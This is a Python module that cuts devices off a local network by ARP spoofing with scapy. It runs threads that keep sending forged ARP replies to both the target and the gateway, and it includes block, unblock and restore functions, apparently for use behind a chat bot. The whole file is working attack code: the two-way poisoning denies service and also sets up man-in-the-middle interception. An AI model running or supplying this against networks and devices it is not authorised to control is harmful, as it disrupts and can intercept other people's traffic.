"""
Network device blocker using ARP spoofing.
Requires: pip install scapy
Requires: Npcap installed on Windows (https://npcap.com)
Must run as Administrator.
"""

import threading
import time
import os
from env_config import load_env_local

load_env_local()

# Track blocked devices: {ip: {"thread": Thread, "stop": Event}}
_blocked = {}
_scapy_available = False

try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.all import ARP, Ether, sendp, srp, conf
    conf.verb = 0
    _scapy_available = True
except ImportError:
    _scapy_available = False


def is_available():
    """Check if ARP spoofing is available (scapy installed)"""
    return _scapy_available


def _get_mac(ip):
    """Get MAC address for an IP using ARP request"""
    if not _scapy_available:
        return None
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False
        )
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None


def _spoof_loop(target_ip, gateway_ip, stop_event):
    """Background thread: continuously send spoofed ARP packets"""
    target_mac = _get_mac(target_ip)
    gateway_mac = _get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print(f"   ❌ Could not resolve MAC for {target_ip} or {gateway_ip}")
        return

    # Tell target: "I am the gateway" (Layer 2 with proper Ether frame)
    pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Tell gateway: "I am the target"
    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    print(f"   🚫 ARP spoofing active for {target_ip} ({target_mac})")

    while not stop_event.is_set():
        try:
            sendp(pkt_to_target, verbose=False)
            sendp(pkt_to_gateway, verbose=False)
        except Exception:
            pass
        stop_event.wait(2)

    # Restore correct ARP entries when unblocking
    print(f"   ✅ Restoring ARP for {target_ip}")
    try:
        restore_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                             psrc=gateway_ip, hwsrc=gateway_mac)
        restore_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                              psrc=target_ip, hwsrc=target_mac)
        for _ in range(5):
            sendp(restore_target, verbose=False)
            sendp(restore_gateway, verbose=False)
            time.sleep(0.3)
    except Exception:
        pass


def block_device(target_ip, gateway_ip=None):
    """Block a device's internet by ARP spoofing. Returns (success, message)."""
    if gateway_ip is None:
        gateway_ip = os.getenv("GATEWAY_IP", "192.168.0.1")
    if not _scapy_available:
        return False, "⚠️ scapy not installed. Run: `pip install scapy` and install Npcap"
    if target_ip in _blocked:
        return False, f"⚠️ `{target_ip}` is already blocked"

    stop_event = threading.Event()
    t = threading.Thread(
        target=_spoof_loop,
        args=(target_ip, gateway_ip, stop_event),
        daemon=True
    )
    _blocked[target_ip] = {"thread": t, "stop": stop_event}
    t.start()
    return True, f"🚫 Blocking `{target_ip}` — internet access cut off"


def unblock_device(target_ip):
    """Unblock a device by stopping ARP spoofing. Returns (success, message)."""
    if target_ip not in _blocked:
        return False, f"⚠️ `{target_ip}` is not currently blocked"

    _blocked[target_ip]["stop"].set()
    _blocked[target_ip]["thread"].join(timeout=10)
    del _blocked[target_ip]
    return True, f"✅ Unblocked `{target_ip}` — internet access restored"


def get_blocked():
    """Return list of currently blocked IPs."""
    return list(_blocked.keys())


def is_blocked(ip):
    """Check if an IP is currently blocked."""
    return ip in _blocked


def unblock_all():
    """Unblock all devices."""
    results = []
    for ip in list(_blocked.keys()):
        _, msg = unblock_device(ip)
        results.append(msg)
    return results
